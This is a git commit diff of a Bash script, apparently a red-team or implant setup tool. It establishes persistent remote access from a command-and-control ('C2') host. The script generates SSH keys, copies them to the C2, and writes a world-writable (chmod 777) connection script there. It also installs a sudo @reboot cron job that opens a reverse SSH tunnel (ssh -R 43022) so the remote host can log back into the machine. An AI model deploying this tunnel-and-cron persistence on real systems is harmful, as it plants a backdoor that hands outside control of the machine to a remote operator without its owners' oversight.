c32c6a53c45e49af56b04c7d9240dd20c3757e1d
Emily Crose <ecrose@dragos.com>
2021-06-20 21:07:28 -0400

    push functional dev script

--- girltalk_dev.sh
+++ girltalk_dev.sh
@@ -82,13 +82,13 @@ if [ ${AWS} = true]; then
 	echo "it works!"
 fi
 
-#Check for connectivity
+# Check for connectivity
 echo "### Checking For Internet ###"
 if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
     echo "IPv4 is up"
     printf "\n"
 
-#Installing deps
+# Installing deps
 if (systemctl -q is-active sshd.service)
 then
     echo "### SSH is Installed And Running! ###"
@@ -102,50 +102,40 @@ else
 fi
     printf "\n"
 
-#Generate local key
+# Generate local key
     echo "### Generating 4096 keypair ###"
     ssh-keygen -b 4096
     printf "\n"
 
-#Provide a valid username local to this host for login
-#    echo "Please enter your local username"
-#    echo ">>> You will use this user's account to log in from your C2! <<<"
-#    read user
-
-#Error checking for user input
+# Error checking for user input
     until id "$USERLOCAL" >/dev/null; do
         echo "Please enter your local username";
-#        read user;
     done
-#    printf "\n"
+    printf "\n"
 
-#Takes input for what remote host you want to route through
-#    echo "Please enter username/IP for desired C2 host (<username>@<C2_host>)"
-#    read C2
-#   printf "\n"
-
-#Transfer local key to C2
+# Transfer local key to C2
     echo "### Copying key to C2 host ###"
     ssh-copy-id $HOST
     printf "\n"
 
-#Generating an ssh key on your C2
-   ssh $HOST 'ssh-keygen'
+# Generating an ssh key on your C2
+    ssh $HOST 'ssh-keygen'
 
-#Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
-echo "### Creating & transferring remote connection script"
-echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERC2/hmu_$USERLOCAL.sh
-sudo chmod 777 /home/$USERC2/hmu_$USERLOCAL.sh 
-scp /home/$USERC2/hmu_$USERLOCAL.sh $HOST:/root
+# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
+    echo "### Creating & transferring remote connection script"
+    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hmu_$USERLOCAL.sh
+    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh 
+    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
+    printf "\n"
 
-#Setup local cron job + cleanup
+# Setup local cron job + cleanup
     echo "### Setting up local cronjob ###"
-    echo "@reboot sleep 100 && sudo -u ${USERLOCAL} ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
+    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
     sudo crontab cronsh
     rm cronsh
     printf "\n"
 
-#Finishing script
+# Finishing script
     echo "### donezo! Please reboot the machine. ###"
 
 else
